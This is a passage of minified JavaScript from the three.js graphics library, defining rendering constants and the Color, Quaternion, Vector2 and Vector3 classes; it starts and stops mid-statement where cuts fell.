d)Object.prototype.hasOwnProperty.call(d,e)&&(b[e]=d[e])}return b}}();\nObject.assign(THREE,{MOUSE:{LEFT:0,MIDDLE:1,RIGHT:2},CullFaceNone:0,CullFaceBack:1,CullFaceFront:2,CullFaceFrontBack:3,FrontFaceDirectionCW:0,FrontFaceDirectionCCW:1,BasicShadowMap:0,PCFShadowMap:1,PCFSoftShadowMap:2,FrontSide:0,BackSide:1,DoubleSide:2,FlatShading:1,SmoothShading:2,NoColors:0,FaceColors:1,VertexColors:2,NoBlending:0,NormalBlending:1,AdditiveBlending:2,SubtractiveBlending:3,MultiplyBlending:4,CustomBlending:5,AddEquation:100,SubtractEquation:101,ReverseSubtractEquation:102,MinEquation:103,\nMaxEquation:104,ZeroFactor:200,OneFactor:201,SrcColorFactor:202,OneMinusSrcColorFactor:203,SrcAlphaFactor:204,OneMinusSrcAlphaFactor:205,DstAlphaFactor:206,OneMinusDstAlphaFactor:207,DstColorFactor:208,OneMinusDstColorFactor:209,SrcAlphaSaturateFactor:210,NeverDepth:0,AlwaysDepth:1,LessDepth:2,LessEqualDepth:3,EqualDepth:4,GreaterEqualDepth:5,GreaterDepth:6,NotEqualDepth:7,MultiplyOperation:0,MixOperation:1,AddOperation:2,NoToneMapping:0,LinearToneMapping:1,ReinhardToneMapping:2,Uncharted2ToneMapping:3,\nCineonToneMapping:4,UVMapping:300,CubeReflectionMapping:301,CubeRefractionMapping:302,EquirectangularReflectionMapping:303,EquirectangularRefractionMapping:304,SphericalReflectionMapping:305,CubeUVReflectionMapping:306,CubeUVRefractionMapping:307,RepeatWrapping:1E3,ClampToEdgeWrapping:1001,MirroredRepeatWrapping:1002,NearestFilter:1003,NearestMipMapNearestFilter:1004,NearestMipMapLinearFilter:1005,LinearFilter:1006,LinearMipMapNearestFilter:1007,LinearMipMapLinearFilter:1008,UnsignedByteType:1009,\nByteType:1010,ShortType:1011,UnsignedShortType:1012,IntType:1013,UnsignedIntType:1014,FloatType:1015,HalfFloatType:1025,UnsignedShort4444Type:1016,UnsignedShort5551Type:1017,UnsignedShort565Type:1018,AlphaFormat:1019,RGBFormat:1020,RGBAFormat:1021,LuminanceFormat:1022,LuminanceAlphaFormat:1023,RGBEFormat:THREE.RGBAFormat,DepthFormat:1026,RGB_S3TC_DXT1_Format:2001,RGBA_S3TC_DXT1_Format:2002,RGBA_S3TC_DXT3_Format:2003,RGBA_S3TC_DXT5_Format:2004,RGB_PVRTC_4BPPV1_Format:2100,RGB_PVRTC_2BPPV1_Format:2101,\nRGBA_PVRTC_4BPPV1_Format:2102,RGBA_PVRTC_2BPPV1_Format:2103,RGB_ETC1_Format:2151,LoopOnce:2200,LoopRepeat:2201,LoopPingPong:2202,InterpolateDiscrete:2300,InterpolateLinear:2301,InterpolateSmooth:2302,ZeroCurvatureEnding:2400,ZeroSlopeEnding:2401,WrapAroundEnding:2402,TrianglesDrawMode:0,TriangleStripDrawMode:1,TriangleFanDrawMode:2,LinearEncoding:3E3,sRGBEncoding:3001,GammaEncoding:3007,RGBEEncoding:3002,LogLuvEncoding:3003,RGBM7Encoding:3004,RGBM16Encoding:3005,RGBDEncoding:3006,BasicDepthPacking:3200,\nRGBADepthPacking:3201});THREE.Color=function(a,b,c){return void 0===b&&void 0===c?this.set(a):this.setRGB(a,b,c)};\nTHREE.Color.prototype={constructor:THREE.Color,r:1,g:1,b:1,set:function(a){a instanceof THREE.Color?this.copy(a):\"number\"===typeof a?this.setHex(a):\"string\"===typeof a&&this.setStyle(a);return this},setScalar:function(a){this.b=this.g=this.r=a},setHex:function(a){a=Math.floor(a);this.r=(a>>16&255)/255;this.g=(a>>8&255)/255;this.b=(a&255)/255;return this},setRGB:function(a,b,c){this.r=a;this.g=b;this.b=c;return this},setHSL:function(){function a(a,c,d){0>d&&(d+=1);1<d&&(d-=1);return d<1/6?a+6*(c-a)*\nd:.5>d?c:d<2/3?a+6*(c-a)*(2/3-d):a}return function(b,c,d){b=THREE.Math.euclideanModulo(b,1);c=THREE.Math.clamp(c,0,1);d=THREE.Math.clamp(d,0,1);0===c?this.r=this.g=this.b=d:(c=.5>=d?d*(1+c):d+c-d*c,d=2*d-c,this.r=a(d,c,b+1/3),this.g=a(d,c,b),this.b=a(d,c,b-1/3));return this}}(),setStyle:function(a){function b(b){void 0!==b&&1>parseFloat(b)&&console.warn(\"THREE.Color: Alpha component of \"+a+\" will be ignored.\")}var c;if(c=/^((?:rgb|hsl)a?)\\(\\s*([^\\)]*)\\)/.exec(a)){var d=c[2];switch(c[1]){case \"rgb\":case \"rgba\":if(c=\n/^(\\d+)\\s*,\\s*(\\d+)\\s*,\\s*(\\d+)\\s*(,\\s*([0-9]*\\.?[0-9]+)\\s*)?$/.exec(d))return this.r=Math.min(255,parseInt(c[1],10))/255,this.g=Math.min(255,parseInt(c[2],10))/255,this.b=Math.min(255,parseInt(c[3],10))/255,b(c[5]),this;if(c=/^(\\d+)\\%\\s*,\\s*(\\d+)\\%\\s*,\\s*(\\d+)\\%\\s*(,\\s*([0-9]*\\.?[0-9]+)\\s*)?$/.exec(d))return this.r=Math.min(100,parseInt(c[1],10))/100,this.g=Math.min(100,parseInt(c[2],10))/100,this.b=Math.min(100,parseInt(c[3],10))/100,b(c[5]),this;break;case \"hsl\":case \"hsla\":if(c=/^([0-9]*\\.?[0-9]+)\\s*,\\s*(\\d+)\\%\\s*,\\s*(\\d+)\\%\\s*(,\\s*([0-9]*\\.?[0-9]+)\\s*)?$/.exec(d)){var d=\nparseFloat(c[1])/360,e=parseInt(c[2],10)/100,f=parseInt(c[3],10)/100;b(c[5]);return this.setHSL(d,e,f)}}}else if(c=/^\\#([A-Fa-f0-9]+)$/.exec(a)){c=c[1];d=c.length;if(3===d)return this.r=parseInt(c.charAt(0)+c.charAt(0),16)/255,this.g=parseInt(c.charAt(1)+c.charAt(1),16)/255,this.b=parseInt(c.charAt(2)+c.charAt(2),16)/255,this;if(6===d)return this.r=parseInt(c.charAt(0)+c.charAt(1),16)/255,this.g=parseInt(c.charAt(2)+c.charAt(3),16)/255,this.b=parseInt(c.charAt(4)+c.charAt(5),16)/255,this}a&&0<a.length&&\n(c=THREE.ColorKeywords[a],void 0!==c?this.setHex(c):console.warn(\"THREE.Color: Unknown color \"+a));return this},clone:function(){return new this.constructor(this.r,this.g,this.b)},copy:function(a){this.r=a.r;this.g=a.g;this.b=a.b;return this},copyGammaToLinear:function(a,b){void 0===b&&(b=2);this.r=Math.pow(a.r,b);this.g=Math.pow(a.g,b);this.b=Math.pow(a.b,b);return this},copyLinearToGamma:function(a,b){void 0===b&&(b=2);var c=0<b?1/b:1;this.r=Math.pow(a.r,c);this.g=Math.pow(a.g,c);this.b=Math.pow(a.b,\nc);return this},convertGammaToLinear:function(){var a=this.r,b=this.g,c=this.b;this.r=a*a;this.g=b*b;this.b=c*c;return this},convertLinearToGamma:function(){this.r=Math.sqrt(this.r);this.g=Math.sqrt(this.g);this.b=Math.sqrt(this.b);return this},getHex:function(){return 255*this.r<<16^255*this.g<<8^255*this.b<<0},getHexString:function(){return(\"000000\"+this.getHex().toString(16)).slice(-6)},getHSL:function(a){a=a||{h:0,s:0,l:0};var b=this.r,c=this.g,d=this.b,e=Math.max(b,c,d),f=Math.min(b,c,d),g,h=\n(f+e)/2;if(f===e)f=g=0;else{var k=e-f,f=.5>=h?k/(e+f):k/(2-e-f);switch(e){case b:g=(c-d)/k+(c<d?6:0);break;case c:g=(d-b)/k+2;break;case d:g=(b-c)/k+4}g/=6}a.h=g;a.s=f;a.l=h;return a},getStyle:function(){return\"rgb(\"+(255*this.r|0)+\",\"+(255*this.g|0)+\",\"+(255*this.b|0)+\")\"},offsetHSL:function(a,b,c){var d=this.getHSL();d.h+=a;d.s+=b;d.l+=c;this.setHSL(d.h,d.s,d.l);return this},add:function(a){this.r+=a.r;this.g+=a.g;this.b+=a.b;return this},addColors:function(a,b){this.r=a.r+b.r;this.g=a.g+b.g;this.b=\na.b+b.b;return this},addScalar:function(a){this.r+=a;this.g+=a;this.b+=a;return this},multiply:function(a){this.r*=a.r;this.g*=a.g;this.b*=a.b;return this},multiplyScalar:function(a){this.r*=a;this.g*=a;this.b*=a;return this},lerp:function(a,b){this.r+=(a.r-this.r)*b;this.g+=(a.g-this.g)*b;this.b+=(a.b-this.b)*b;return this},equals:function(a){return a.r===this.r&&a.g===this.g&&a.b===this.b},fromArray:function(a,b){void 0===b&&(b=0);this.r=a[b];this.g=a[b+1];this.b=a[b+2];return this},toArray:function(a,\nb){void 0===a&&(a=[]);void 0===b&&(b=0);a[b]=this.r;a[b+1]=this.g;a[b+2]=this.b;return a}};\nTHREE.ColorKeywords={aliceblue:15792383,antiquewhite:16444375,aqua:65535,aquamarine:8388564,azure:15794175,beige:16119260,bisque:16770244,black:0,blanchedalmond:16772045,blue:255,blueviolet:9055202,brown:10824234,burlywood:14596231,cadetblue:6266528,chartreuse:8388352,chocolate:13789470,coral:16744272,cornflowerblue:6591981,cornsilk:16775388,crimson:14423100,cyan:65535,darkblue:139,darkcyan:35723,darkgoldenrod:12092939,darkgray:11119017,darkgreen:25600,darkgrey:11119017,darkkhaki:12433259,darkmagenta:9109643,\ndarkolivegreen:5597999,darkorange:16747520,darkorchid:10040012,darkred:9109504,darksalmon:15308410,darkseagreen:9419919,darkslateblue:4734347,darkslategray:3100495,darkslategrey:3100495,darkturquoise:52945,darkviolet:9699539,deeppink:16716947,deepskyblue:49151,dimgray:6908265,dimgrey:6908265,dodgerblue:2003199,firebrick:11674146,floralwhite:16775920,forestgreen:2263842,fuchsia:16711935,gainsboro:14474460,ghostwhite:16316671,gold:16766720,goldenrod:14329120,gray:8421504,green:32768,greenyellow:11403055,\ngrey:8421504,honeydew:15794160,hotpink:16738740,indianred:13458524,indigo:4915330,ivory:16777200,khaki:15787660,lavender:15132410,lavenderblush:16773365,lawngreen:8190976,lemonchiffon:16775885,lightblue:11393254,lightcoral:15761536,lightcyan:14745599,lightgoldenrodyellow:16448210,lightgray:13882323,lightgreen:9498256,lightgrey:13882323,lightpink:16758465,lightsalmon:16752762,lightseagreen:2142890,lightskyblue:8900346,lightslategray:7833753,lightslategrey:7833753,lightsteelblue:11584734,lightyellow:16777184,\nlime:65280,limegreen:3329330,linen:16445670,magenta:16711935,maroon:8388608,mediumaquamarine:6737322,mediumblue:205,mediumorchid:12211667,mediumpurple:9662683,mediumseagreen:3978097,mediumslateblue:8087790,mediumspringgreen:64154,mediumturquoise:4772300,mediumvioletred:13047173,midnightblue:1644912,mintcream:16121850,mistyrose:16770273,moccasin:16770229,navajowhite:16768685,navy:128,oldlace:16643558,olive:8421376,olivedrab:7048739,orange:16753920,orangered:16729344,orchid:14315734,palegoldenrod:15657130,\npalegreen:10025880,paleturquoise:11529966,palevioletred:14381203,papayawhip:16773077,peachpuff:16767673,peru:13468991,pink:16761035,plum:14524637,powderblue:11591910,purple:8388736,red:16711680,rosybrown:12357519,royalblue:4286945,saddlebrown:9127187,salmon:16416882,sandybrown:16032864,seagreen:3050327,seashell:16774638,sienna:10506797,silver:12632256,skyblue:8900331,slateblue:6970061,slategray:7372944,slategrey:7372944,snow:16775930,springgreen:65407,steelblue:4620980,tan:13808780,teal:32896,thistle:14204888,\ntomato:16737095,turquoise:4251856,violet:15631086,wheat:16113331,white:16777215,whitesmoke:16119285,yellow:16776960,yellowgreen:10145074};THREE.Quaternion=function(a,b,c,d){this._x=a||0;this._y=b||0;this._z=c||0;this._w=void 0!==d?d:1};\nTHREE.Quaternion.prototype={constructor:THREE.Quaternion,get x(){return this._x},set x(a){this._x=a;this.onChangeCallback()},get y(){return this._y},set y(a){this._y=a;this.onChangeCallback()},get z(){return this._z},set z(a){this._z=a;this.onChangeCallback()},get w(){return this._w},set w(a){this._w=a;this.onChangeCallback()},set:function(a,b,c,d){this._x=a;this._y=b;this._z=c;this._w=d;this.onChangeCallback();return this},clone:function(){return new this.constructor(this._x,this._y,this._z,this._w)},\ncopy:function(a){this._x=a.x;this._y=a.y;this._z=a.z;this._w=a.w;this.onChangeCallback();return this},setFromEuler:function(a,b){if(!1===a instanceof THREE.Euler)throw Error(\"THREE.Quaternion: .setFromEuler() now expects a Euler rotation rather than a Vector3 and order.\");var c=Math.cos(a._x/2),d=Math.cos(a._y/2),e=Math.cos(a._z/2),f=Math.sin(a._x/2),g=Math.sin(a._y/2),h=Math.sin(a._z/2),k=a.order;\"XYZ\"===k?(this._x=f*d*e+c*g*h,this._y=c*g*e-f*d*h,this._z=c*d*h+f*g*e,this._w=c*d*e-f*g*h):\"YXZ\"===\nk?(this._x=f*d*e+c*g*h,this._y=c*g*e-f*d*h,this._z=c*d*h-f*g*e,this._w=c*d*e+f*g*h):\"ZXY\"===k?(this._x=f*d*e-c*g*h,this._y=c*g*e+f*d*h,this._z=c*d*h+f*g*e,this._w=c*d*e-f*g*h):\"ZYX\"===k?(this._x=f*d*e-c*g*h,this._y=c*g*e+f*d*h,this._z=c*d*h-f*g*e,this._w=c*d*e+f*g*h):\"YZX\"===k?(this._x=f*d*e+c*g*h,this._y=c*g*e+f*d*h,this._z=c*d*h-f*g*e,this._w=c*d*e-f*g*h):\"XZY\"===k&&(this._x=f*d*e-c*g*h,this._y=c*g*e-f*d*h,this._z=c*d*h+f*g*e,this._w=c*d*e+f*g*h);if(!1!==b)this.onChangeCallback();return this},setFromAxisAngle:function(a,\nb){var c=b/2,d=Math.sin(c);this._x=a.x*d;this._y=a.y*d;this._z=a.z*d;this._w=Math.cos(c);this.onChangeCallback();return this},setFromRotationMatrix:function(a){var b=a.elements,c=b[0];a=b[4];var d=b[8],e=b[1],f=b[5],g=b[9],h=b[2],k=b[6],b=b[10],l=c+f+b;0<l?(c=.5/Math.sqrt(l+1),this._w=.25/c,this._x=(k-g)*c,this._y=(d-h)*c,this._z=(e-a)*c):c>f&&c>b?(c=2*Math.sqrt(1+c-f-b),this._w=(k-g)/c,this._x=.25*c,this._y=(a+e)/c,this._z=(d+h)/c):f>b?(c=2*Math.sqrt(1+f-c-b),this._w=(d-h)/c,this._x=(a+e)/c,this._y=\n.25*c,this._z=(g+k)/c):(c=2*Math.sqrt(1+b-c-f),this._w=(e-a)/c,this._x=(d+h)/c,this._y=(g+k)/c,this._z=.25*c);this.onChangeCallback();return this},setFromUnitVectors:function(){var a,b;return function(c,d){void 0===a&&(a=new THREE.Vector3);b=c.dot(d)+1;1E-6>b?(b=0,Math.abs(c.x)>Math.abs(c.z)?a.set(-c.y,c.x,0):a.set(0,-c.z,c.y)):a.crossVectors(c,d);this._x=a.x;this._y=a.y;this._z=a.z;this._w=b;return this.normalize()}}(),inverse:function(){return this.conjugate().normalize()},conjugate:function(){this._x*=\n-1;this._y*=-1;this._z*=-1;this.onChangeCallback();return this},dot:function(a){return this._x*a._x+this._y*a._y+this._z*a._z+this._w*a._w},lengthSq:function(){return this._x*this._x+this._y*this._y+this._z*this._z+this._w*this._w},length:function(){return Math.sqrt(this._x*this._x+this._y*this._y+this._z*this._z+this._w*this._w)},normalize:function(){var a=this.length();0===a?(this._z=this._y=this._x=0,this._w=1):(a=1/a,this._x*=a,this._y*=a,this._z*=a,this._w*=a);this.onChangeCallback();return this},\nmultiply:function(a,b){return void 0!==b?(console.warn(\"THREE.Quaternion: .multiply() now only accepts one argument. Use .multiplyQuaternions( a, b ) instead.\"),this.multiplyQuaternions(a,b)):this.multiplyQuaternions(this,a)},premultiply:function(a){return this.multiplyQuaternions(a,this)},multiplyQuaternions:function(a,b){var c=a._x,d=a._y,e=a._z,f=a._w,g=b._x,h=b._y,k=b._z,l=b._w;this._x=c*l+f*g+d*k-e*h;this._y=d*l+f*h+e*g-c*k;this._z=e*l+f*k+c*h-d*g;this._w=f*l-c*g-d*h-e*k;this.onChangeCallback();\nreturn this},slerp:function(a,b){if(0===b)return this;if(1===b)return this.copy(a);var c=this._x,d=this._y,e=this._z,f=this._w,g=f*a._w+c*a._x+d*a._y+e*a._z;0>g?(this._w=-a._w,this._x=-a._x,this._y=-a._y,this._z=-a._z,g=-g):this.copy(a);if(1<=g)return this._w=f,this._x=c,this._y=d,this._z=e,this;var h=Math.sqrt(1-g*g);if(.001>Math.abs(h))return this._w=.5*(f+this._w),this._x=.5*(c+this._x),this._y=.5*(d+this._y),this._z=.5*(e+this._z),this;var k=Math.atan2(h,g),g=Math.sin((1-b)*k)/h,h=Math.sin(b*\nk)/h;this._w=f*g+this._w*h;this._x=c*g+this._x*h;this._y=d*g+this._y*h;this._z=e*g+this._z*h;this.onChangeCallback();return this},equals:function(a){return a._x===this._x&&a._y===this._y&&a._z===this._z&&a._w===this._w},fromArray:function(a,b){void 0===b&&(b=0);this._x=a[b];this._y=a[b+1];this._z=a[b+2];this._w=a[b+3];this.onChangeCallback();return this},toArray:function(a,b){void 0===a&&(a=[]);void 0===b&&(b=0);a[b]=this._x;a[b+1]=this._y;a[b+2]=this._z;a[b+3]=this._w;return a},onChange:function(a){this.onChangeCallback=\na;return this},onChangeCallback:function(){}};\nObject.assign(THREE.Quaternion,{slerp:function(a,b,c,d){return c.copy(a).slerp(b,d)},slerpFlat:function(a,b,c,d,e,f,g){var h=c[d+0],k=c[d+1],l=c[d+2];c=c[d+3];d=e[f+0];var n=e[f+1],p=e[f+2];e=e[f+3];if(c!==e||h!==d||k!==n||l!==p){f=1-g;var m=h*d+k*n+l*p+c*e,q=0<=m?1:-1,r=1-m*m;r>Number.EPSILON&&(r=Math.sqrt(r),m=Math.atan2(r,m*q),f=Math.sin(f*m)/r,g=Math.sin(g*m)/r);q*=g;h=h*f+d*q;k=k*f+n*q;l=l*f+p*q;c=c*f+e*q;f===1-g&&(g=1/Math.sqrt(h*h+k*k+l*l+c*c),h*=g,k*=g,l*=g,c*=g)}a[b]=h;a[b+1]=k;a[b+2]=l;\na[b+3]=c}});THREE.Vector2=function(a,b){this.x=a||0;this.y=b||0};\nTHREE.Vector2.prototype={constructor:THREE.Vector2,get width(){return this.x},set width(a){this.x=a},get height(){return this.y},set height(a){this.y=a},set:function(a,b){this.x=a;this.y=b;return this},setScalar:function(a){this.y=this.x=a;return this},setX:function(a){this.x=a;return this},setY:function(a){this.y=a;return this},setComponent:function(a,b){switch(a){case 0:this.x=b;break;case 1:this.y=b;break;default:throw Error(\"index is out of range: \"+a);}},getComponent:function(a){switch(a){case 0:return this.x;\ncase 1:return this.y;default:throw Error(\"index is out of range: \"+a);}},clone:function(){return new this.constructor(this.x,this.y)},copy:function(a){this.x=a.x;this.y=a.y;return this},add:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector2: .add() now only accepts one argument. Use .addVectors( a, b ) instead.\"),this.addVectors(a,b);this.x+=a.x;this.y+=a.y;return this},addScalar:function(a){this.x+=a;this.y+=a;return this},addVectors:function(a,b){this.x=a.x+b.x;this.y=a.y+b.y;return this},\naddScaledVector:function(a,b){this.x+=a.x*b;this.y+=a.y*b;return this},sub:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector2: .sub() now only accepts one argument. Use .subVectors( a, b ) instead.\"),this.subVectors(a,b);this.x-=a.x;this.y-=a.y;return this},subScalar:function(a){this.x-=a;this.y-=a;return this},subVectors:function(a,b){this.x=a.x-b.x;this.y=a.y-b.y;return this},multiply:function(a){this.x*=a.x;this.y*=a.y;return this},multiplyScalar:function(a){isFinite(a)?(this.x*=a,\nthis.y*=a):this.y=this.x=0;return this},divide:function(a){this.x/=a.x;this.y/=a.y;return this},divideScalar:function(a){return this.multiplyScalar(1/a)},min:function(a){this.x=Math.min(this.x,a.x);this.y=Math.min(this.y,a.y);return this},max:function(a){this.x=Math.max(this.x,a.x);this.y=Math.max(this.y,a.y);return this},clamp:function(a,b){this.x=Math.max(a.x,Math.min(b.x,this.x));this.y=Math.max(a.y,Math.min(b.y,this.y));return this},clampScalar:function(){var a,b;return function(c,d){void 0===\na&&(a=new THREE.Vector2,b=new THREE.Vector2);a.set(c,c);b.set(d,d);return this.clamp(a,b)}}(),clampLength:function(a,b){var c=this.length();return this.multiplyScalar(Math.max(a,Math.min(b,c))/c)},floor:function(){this.x=Math.floor(this.x);this.y=Math.floor(this.y);return this},ceil:function(){this.x=Math.ceil(this.x);this.y=Math.ceil(this.y);return this},round:function(){this.x=Math.round(this.x);this.y=Math.round(this.y);return this},roundToZero:function(){this.x=0>this.x?Math.ceil(this.x):Math.floor(this.x);\nthis.y=0>this.y?Math.ceil(this.y):Math.floor(this.y);return this},negate:function(){this.x=-this.x;this.y=-this.y;return this},dot:function(a){return this.x*a.x+this.y*a.y},lengthSq:function(){return this.x*this.x+this.y*this.y},length:function(){return Math.sqrt(this.x*this.x+this.y*this.y)},lengthManhattan:function(){return Math.abs(this.x)+Math.abs(this.y)},normalize:function(){return this.divideScalar(this.length())},angle:function(){var a=Math.atan2(this.y,this.x);0>a&&(a+=2*Math.PI);return a},\ndistanceTo:function(a){return Math.sqrt(this.distanceToSquared(a))},distanceToSquared:function(a){var b=this.x-a.x;a=this.y-a.y;return b*b+a*a},setLength:function(a){return this.multiplyScalar(a/this.length())},lerp:function(a,b){this.x+=(a.x-this.x)*b;this.y+=(a.y-this.y)*b;return this},lerpVectors:function(a,b,c){return this.subVectors(b,a).multiplyScalar(c).add(a)},equals:function(a){return a.x===this.x&&a.y===this.y},fromArray:function(a,b){void 0===b&&(b=0);this.x=a[b];this.y=a[b+1];return this},\ntoArray:function(a,b){void 0===a&&(a=[]);void 0===b&&(b=0);a[b]=this.x;a[b+1]=this.y;return a},fromAttribute:function(a,b,c){void 0===c&&(c=0);b=b*a.itemSize+c;this.x=a.array[b];this.y=a.array[b+1];return this},rotateAround:function(a,b){var c=Math.cos(b),d=Math.sin(b),e=this.x-a.x,f=this.y-a.y;this.x=e*c-f*d+a.x;this.y=e*d+f*c+a.y;return this}};THREE.Vector3=function(a,b,c){this.x=a||0;this.y=b||0;this.z=c||0};\nTHREE.Vector3.prototype={constructor:THREE.Vector3,set:function(a,b,c){this.x=a;this.y=b;this.z=c;return this},setScalar:function(a){this.z=this.y=this.x=a;return this},setX:function(a){this.x=a;return this},setY:function(a){this.y=a;return this},setZ:function(a){this.z=a;return this},setComponent:function(a,b){switch(a){case 0:this.x=b;break;case 1:this.y=b;break;case 2:this.z=b;break;default:throw Error(\"index is out of range: \"+a);}},getComponent:function(a){switch(a){case 0:return this.x;case 1:return this.y;\ncase 2:return this.z;default:throw Error(\"index is out of range: \"+a);}},clone:function(){return new this.constructor(this.x,this.y,this.z)},copy:function(a){this.x=a.x;this.y=a.y;this.z=a.z;return this},add:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector3: .add() now only accepts one argument. Use .addVectors( a, b ) instead.\"),this.addVectors(a,b);this.x+=a.x;this.y+=a.y;this.z+=a.z;return this},addScalar:function(a){this.x+=a;this.y+=a;this.z+=a;return this},addVectors:function(a,\nb){this.x=a.x+b.x;this.y=a.y+b.y;this.z=a.z+b.z;return this},addScaledVector:function(a,b){this.x+=a.x*b;this.y+=a.y*b;this.z+=a.z*b;return this},sub:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector3: .sub() now only accepts one argument. Use .subVectors( a, b ) instead.\"),this.subVectors(a,b);this.x-=a.x;this.y-=a.y;this.z-=a.z;return this},subScalar:function(a){this.x-=a;this.y-=a;this.z-=a;return this},subVectors:function(a,b){this.x=a.x-b.x;this.y=a.y-b.y;this.z=a.z-b.z;return this},\nmultiply:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector3: .multiply() now only accepts one argument. Use .multiplyVectors( a, b ) instead.\"),this.multiplyVectors(a,b);this.x*=a.x;this.y*=a.y;this.z*=a.z;return this},multiplyScalar:function(a){isFinite(a)?(this.x*=a,this.y*=a,this.z*=a):this.z=this.y=this.x=0;return this},multiplyVectors:function(a,b){this.x=a.x*b.x;this.y=a.y*b.y;this.z=a.z*b.z;return this},applyEuler:function(){var a;return function(b){!1===b instanceof THREE.Euler&&\nconsole.error(\"THREE.Vector3: .applyEuler() now expects an Euler rotation rather than a Vector3 and order.\");void 0===a&&(a=new THREE.Quaternion);return this.applyQuaternion(a.setFromEuler(b))}}(),applyAxisAngle:function(){var a;return function(b,c){void 0===a&&(a=new THREE.Quaternion);return this.applyQuaternion(a.setFromAxisAngle(b,c))}}(),applyMatrix3:function(a){var b=this.x,c=this.y,d=this.z;a=a.elements;this.x=a[0]*b+a[3]*c+a[6]*d;this.y=a[1]*b+a[4]*c+a[7]*d;this.z=a[2]*b+a[5]*c+a[8]*d;return this},\napplyMatrix4:function(a){var b=this.x,c=this.y,d=this.z;a=a.elements;this.x=a[0]*b+a[4]*c+a[8]*d+a[12];this.y=a[1]*b+a[5]*c+a[9]*d+a[13];this.z=a[2]*b+a[6]*c+a[10]*d+a[14];return this},applyProjection:function(a){var b=this.x,c=this.y,d=this.z;a=a.elements;var e=1/(a[3]*b+a[7]*c+a[11]*d+a[15]);this.x=(a[0]*b+a[4]*c+a[8]*d+a[12])*e;this.y=(a[1]*b+a[5]*c+a[9]*d+a[13])*e;this.z=(a[2]*b+a[6]*c+a[10]*d+a[14])*e;return this},applyQuaternion:function(a){var b=this.x,c=this.y,d=this.z,e=a.x,f=a.y,g=a.z;a=\na.w;var h=a*b+f*d-g*c,k=a*c+g*b-e*d,l=a*d+e*c-f*b,b=-e*b-f*c-g*d;this.x=h*a+b*-e+k*-g-l*-f;this.y=k*a+b*-f+l*-e-h*-g;this.z=l*a+b*-g+h*-f-k*-e;return this},project:function(){var a;return function(b){void 0===a&&(a=new THREE.Matrix4);a.multiplyMatrices(b.projectionMatrix,a.getInverse(b.matrixWorld));return this.applyProjection(a)}}(),unproject:function(){var a;return function(b){void 0===a&&(a=new THREE.Matrix4);a.multiplyMatrices(b.matrixWorld,a.getInverse(b.projectionMatrix));return this.applyProjection(a)}}(),\ntransformDirection:function(a){var b=this.x,c=this.y,d=this.z;a=a.elements;this.x=a[0]*b+a[4]*c+a[8]*d;this.y=a[1]*b+a[5]*c+a[9]*d;this.z=a[2]*b+a[6]*c+a[10]*d;return this.normalize()},divide:function(a){this.x/=a.x;this.y/=a.y;this.z/=a.z;return this},divideScalar:function(a){return this.multiplyScalar(1/a)},min:function(a){this.x=Math.min(this.x,a.x);this.y=Math.min(this.y,a.y);this.z=Math.min(this.z,a.z);return this},max:function(a){this.x=Math.max(this.x,a.x);this.y=Math.max(this.y,a.y);this.z=\nMath.max(this.z,a.z);return this},clamp:function(a,b){this.x=Math.max(a.x,Math.min(b.x,this.x));this.y=Math.max(a.y,Math.min(b.y,this.y));this.z=Math.max(a.z,Math.min(b.z,this.z));return this},clampScalar:function(){var a,b;return function(c,d){void 0===a&&(a=new THREE.Vector3,b=new THREE.Vector3);a.set(c,c,c);b.set(d,d,d);return this.clamp(a,b)}}(),clampLength:function(a,b){var c=this.length();return this.multiplyScalar(Math.max(a,Math.min(b,c))/c)},floor:function(){this.x=Math.floor(this.x);this.y=\nMath.floor(this.y);this.z=Math.floor(this.z);return this},ceil:function(){this.x=Math.ceil(this.x);this.y=Math.ceil(this.y);this.z=Math.ceil(this.z);return this},round:function(){this.x=Math.round(this.x);this.y=Math.round(this.y);this.z=Math.round(this.z);return this},roundToZero:function(){this.x=0>this.x?Math.ceil(this.x):Math.floor(this.x);this.y=0>this.y?Math.ceil(this.y):Math.floor(this.y);this.z=0>this.z?Math.ceil(this.z):Math.floor(this.z);return this},negate:function(){this.x=-this.x;this.y=\n-this.y;this.z=-this.z;return this},dot:function(a){return this.x*a.x+this.y*a.y+this.z*a.z},lengthSq:function(){return this.x*this.x+this.y*this.y+this.z*this.z},length:function(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z)},lengthManhattan:function(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)},normalize:function(){return this.divideScalar(this.length())},setLength:function(a){return this.multiplyScalar(a/this.length())},lerp:function(a,b){this.x+=(a.x-this.x)*b;this.y+=\n(a.y-this.y)*b;this.z+=(a.z-this.z)*b;return this},lerpVectors:function(a,b,c){return this.subVectors(b,a).multiplyScalar(c).add(a)},cross:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector3: .cross() now only accepts one argument. Use .crossVectors( a, b ) instead.\"),this.crossVectors(a,b);var c=this.x,d=this.y,e=this.z;this.x=d*a.z-e*a.y;this.y=e*a.x-c*a.z;this.z=c*a.y-d*a.x;return this},crossVectors:function(a,b){var c=a.x,d=a.y,e=a.z,f=b.x,g=b.y,h=b.z;this.x=d*h-e*g;this.y=e*f-c*h;\nthis.z=c*g-d*f;return this},projectOnVector:function(a){var b=a.dot(this)/a.lengthSq();return this.copy(a).multiplyScalar(b)},projectOnPlane:function(){var a;return function(b){void 0===a&&(a=new THREE.Vector3);a.copy(this).projectOnVector(b);return this.sub(a)}}(),reflect:function(){var a;return function(b){void 0===a&&(a=new THREE.Vector3);return this.sub(a.copy(b).multiplyScalar(2*this.dot(b)))}}(),angleTo:function(a){a=this.dot(a)/Math.sqrt(this.lengthSq()*a.lengthSq());return Math.acos(THREE.Math.clamp(a,\n-1,1))},distanceTo:function(a){return Math.sqrt(this.distanceToSquared(a))},distanceToSquared:function(a){var b=this.x-a.x,c=this.y-a.y;a=this.z-a.z;return b*b+c*c+a*a},setFromSpherical:function(a){var b=Math.sin(a.phi)*a.radius;this.x=b*Math.sin(a.theta);this.y=Math.cos(a.phi)*a.radius;this.z=b*Math.cos(a.theta);return this},setFromMatrixPosition:function(a){return this.setFromMatrixColumn(a,3)},setFromMatrixScale:function(a){var b=this.setFromMatrixColumn(a,0).length(),c=this.setFromMatrixColumn(a,\n1).length();a=this.setFromMatrixColumn(a,2).length();this.x=b;this.y=c;this.z=a;return this},setFromMatrixColumn:function(a,b){if(\"number\"===typeof 